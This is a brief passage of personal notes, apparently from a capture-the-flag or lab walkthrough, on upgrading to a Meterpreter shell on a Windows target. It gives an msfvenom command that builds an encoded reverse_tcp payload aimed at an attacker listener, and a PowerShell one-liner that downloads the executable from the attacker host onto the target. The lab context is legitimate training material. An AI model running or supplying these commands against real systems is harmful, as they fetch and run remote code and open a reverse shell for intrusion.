we will now change the shell to the mterpreter shell

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.4.208 LPORT=9001 -f exe -o rev.exe`

![[Pasted image 20210527160634.png]]

and transfer and start a listener and run

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/rev.exe','C:\Users\bruce\desktop\rev.exe')"
```

![[Pasted image 20210527162653.png]]

